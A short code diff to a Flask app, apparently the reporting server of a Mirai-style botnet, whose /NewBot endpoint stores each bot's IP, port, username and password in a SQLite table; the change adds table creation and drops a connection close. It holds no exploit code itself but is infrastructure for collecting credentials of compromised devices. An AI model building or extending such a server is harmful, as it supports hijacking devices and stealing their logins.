@@ -3,6 +3,7 @@ from app import app
 from flask import g, request, jsonify
 
 DATABASE = "mirai.db"
+CREATE_STMT = "CREATE TABLE IF NOT EXISTS bots (ip string, port int, uname string, pword string)"
 
 @app.route("/NewBot", methods = ['POST'])
 def new_bot():
@@ -20,7 +21,6 @@ def new_bot():
         i_port = int(port)
         c.execute("INSERT INTO bots (ip, port, uname, pword) values (?, ?, ?, ?)", (ip, i_port, uname, pword))
         get_db().commit()
-        close_connection()
         return jsonify({'success': True})
     else:
         print("error")
@@ -42,6 +42,7 @@ def get_db():
     db = getattr(g, '_database', None)
     if db is None:
         db = g._database = sqlite3.connect(DATABASE)
+    db.execute(CREATE_STMT)
     return db
 
 @app.teardown_appcontext
